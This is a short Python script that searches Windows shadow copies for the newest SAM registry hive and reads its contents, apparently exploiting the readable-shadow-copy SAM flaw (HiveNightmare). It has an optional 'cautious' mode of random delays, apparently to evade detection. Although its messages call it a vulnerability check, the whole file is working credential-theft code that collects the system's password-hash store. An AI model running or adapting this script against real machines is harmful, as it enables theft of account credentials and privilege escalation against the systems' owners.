from os import stat, stat_result
from random import random, randint
from time import sleep

cautious = False
minimum_checks = 15

def exercise_caution():
    global cautious
    if cautious:
        min_sleep = 1
        max_sleep = 5
        sleep(random() * randint(min_sleep,max_sleep))

def get_newest_hashes():
    hive_base = r'\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{i}\Windows\System32\config\SAM'
    hive_n = 1
    newest = (None, stat_result([0 for i in range(10)]))
    finding_newest_hive = True
    newest_hashes = None  

    while finding_newest_hive:
        try:
            current_hive = hive_base.format(i=hive_n)
            current_stat = stat(current_hive)
            if current_stat.st_ctime > newest[1].st_ctime:
                newest = (current_hive, current_stat)
            exercise_caution()
        except PermissionError as e:
            # permission error: report not vulnerable
            return None
        except FileNotFoundError as e:
            # reached the end
            if hive_n >= minimum_checks:
                finding_newest_hive = False
                break
        hive_n += 1

    if newest[0] is not None:
        with open(newest[0], 'rb') as f:
            newest_hashes = f.read()

    return newest_hashes

if __name__ == "__main__":
    hashes = get_newest_hashes()
    if hashes is None:
        print("not vulnerable.")
    else:
        print("Hashes collected.")